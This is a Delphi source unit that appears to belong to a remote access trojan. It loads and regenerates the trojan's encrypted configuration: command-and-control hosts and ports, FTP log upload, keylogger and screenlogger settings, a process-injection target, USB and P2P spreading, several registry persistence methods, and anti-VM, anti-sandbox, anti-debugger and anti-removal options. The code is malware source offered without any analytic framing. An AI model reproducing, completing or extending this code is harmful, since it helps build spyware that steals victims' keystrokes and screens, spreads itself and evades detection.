unit UnitConfiguration;

interface

uses
  Windows, UnitFunctions, UnitConstants, UnitEncryption;

var
  _Hosts: array[0..4] of string;
  _Ports: array[0..4] of Word;
  _FTPOptions, _MessageParams: array[0..3] of string;
  _KeylogSize: Integer;
  _Delay, _FTPPort, _FTPDelay: Word;
  _ClientId, _StartupKey, _Password, _GroupId, _MutexName,
  _Foldername, _FileName, _Destination, _InjectInto, _ActiveX,
  _SpreadAs, _P2PNames, _Windows, _DatasPath, _PluginUrl: string;
  _FakeMessage, _Install, _Keylogger, _Melt, _Startup,
  _Hide, _WaitReboot, _ChangeDate, _HKCUStartup, _HKLMStartup,
  _PoliciesStartup, _Persistence, _FTPLogs, _USB, _P2P,
  _AntiVM, _AntiSB, _AntiDG, _AntiPA, _RunOnceStartup,
  _Screenlogger, _AntiRemove: Boolean;
  //-----
  ClientPath, DatasPath, PluginsDir: string;

procedure CheckConfiguration;
function GenerateConfig: string;

implementation

function LoadConfiguration(Config: string = ''): Boolean;
var
  TmpStr: string;
  TmpList, TmpList1: TStringArray;
  i: Integer;
begin
  Result := False;

  if Config <> '' then
  begin
    TmpStr := FileToStr(Config);
    TmpStr := XorEnDecrypt(TmpStr);
  end
  else
  begin
    TmpStr := GetResourceAsString('CFG');
    TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
  end;

  if TmpStr = '' then Exit;
  TmpList := ParseString('|', TmpStr);

  TmpList1 := ParseString('#', TmpList[0]);
  for i := 0 to High(_Hosts) do _Hosts[i] := TmpList1[i];

  TmpList1 := ParseString('#', TmpList[1]);
  for i := 0 to High(_Ports) do _Ports[i] := StrToInt(TmpList1[i]);

  TmpList1 := ParseString('#', TmpList[2]);
  for i := 0 to High(_FTPOptions) do _FTPOptions[i] := TmpList1[i];

  TmpList1 := ParseString('#', TmpList[3]);
  for i := 0 to High(_MessageParams) do _MessageParams[i] := TmpList1[i];

  _Delay := StrToInt(TmpList[4]);
  _FTPPort := StrToInt(TmpList[5]);
  _FTPDelay := StrToInt(TmpList[6]);
  _KeylogSize	:= StrToInt(TmpList[7]);

  _GroupId := TmpList[8];
  _ClientId := TmpList[9];
  _StartupKey := TmpList[10];
  _Password := TmpList[11];
  _MutexName := TmpList[12];
  _Foldername := TmpList[13];
  _FileName := TmpList[14];
  _Destination := TmpList[15];
  _InjectInto := TmpList[16];
  _ActiveX := TmpList[17];
  _SpreadAs := TmpList[18];
  _P2PNames := TmpList[19];
  _Windows := TmpList[20];

  _FakeMessage := MyStrToBool(TmpList[21]);
  _Install := MyStrToBool(TmpList[22]);
  _Keylogger := MyStrToBool(TmpList[23]);
  _Melt := MyStrToBool(TmpList[24]);
  _Startup := MyStrToBool(TmpList[25]);
  _Hide := MyStrToBool(TmpList[26]);
  _WaitReboot := MyStrToBool(TmpList[27]);
  _ChangeDate := MyStrToBool(TmpList[28]);
  _HKCUStartup := MyStrToBool(TmpList[29]);
  _HKLMStartup := MyStrToBool(TmpList[30]);
  _PoliciesStartup := MyStrToBool(TmpList[31]);
  _RunOnceStartup := MyStrToBool(TmpList[32]);
  _Persistence := MyStrToBool(TmpList[33]);
  _FTPLogs := MyStrToBool(TmpList[34]);
  _USB := MyStrToBool(TmpList[35]);
  _P2P := MyStrToBool(TmpList[36]);
  _AntiVM := MyStrToBool(TmpList[37]);
  _AntiSB := MyStrToBool(TmpList[38]);
  _AntiDG := MyStrToBool(TmpList[39]);
  _AntiPA := MyStrToBool(TmpList[40]);
  _Screenlogger := MyStrToBool(TmpList[41]);
  _AntiRemove := MyStrToBool(TmpList[42]);
  _PluginUrl := TmpList[43];
  _DatasPath := TmpList[44];

  Result := True;
end;

procedure CheckConfiguration;
var
  TmpStr: string;
begin
  if not LoadConfiguration then ExitProcess(0);
  TmpStr := _DatasPath + '\cfg';
  if not FileExists(TmpStr) then Exit;
  if not LoadConfiguration(TmpStr) then ExitProcess(0);
end;
    
function GenerateConfig: string;
var
  i: Integer;
begin
  for i := 0 to 4 do
  Result := Result + _Hosts[i] + '#';
  Result := Result + '|';
	
  for i := 0 to 4 do
  Result := Result + IntToStr(_Ports[i]) + '#';
  Result := Result + '|';

	for i := 0 to 3 do
  Result := Result + _FTPOptions[i] + '#';
  Result := Result + '|';
  
	for i := 0 to 3 do
  Result := Result + _MessageParams[i] + '#';
  Result := Result + '|';

  Result := Result + IntToStr(_Delay) + '|' + IntToStr(_FTPPort) + '|' +
    IntToStr(_FTPDelay) + '|' + IntToStr(_KeylogSize) + '|' + _GroupId + '|' +
    _ClientId + '|' + _StartupKey + '|' + _Password + '|' + _MutexName + '|' +
    _Foldername + '|' + _FileName + '|' + _Destination + '|' + _InjectInto + '|' +
    _ActiveX + '|' + _SpreadAs + '|' + _P2PNames + '|' + _Windows + '|' +
    MyBoolToStr(_FakeMessage) + '|' + MyBoolToStr(_Install) + '|' +
    MyBoolToStr(_Keylogger) + '|' + MyBoolToStr(_Melt) + '|' +
    MyBoolToStr(_Startup) + '|' + MyBoolToStr(_Hide) + '|' +
    MyBoolToStr(_WaitReboot) + '|' + MyBoolToStr(_ChangeDate) + '|' +
    MyBoolToStr(_HKCUStartup) + '|' + MyBoolToStr(_HKLMStartup) + '|' +
    MyBoolToStr(_PoliciesStartup) + '|' + MyBoolToStr(_RunOnceStartup) + '|' +
    MyBoolToStr(_Persistence) + '|' + MyBoolToStr(_FTPLogs) + '|' + MyBoolToStr(_USB) + '|' +
    MyBoolToStr(_P2P) + '|' + MyBoolToStr(_AntiVM) + '|' + MyBoolToStr(_AntiSB) + '|' +
    MyBoolToStr(_AntiDG) + '|' + MyBoolToStr(_AntiPA) + '|' + MyBoolToStr(_Screenlogger) + '|' +
    MyBoolToStr(_AntiRemove) + '|' + _PluginUrl + '|' + _DatasPath + '|';
end;

end.
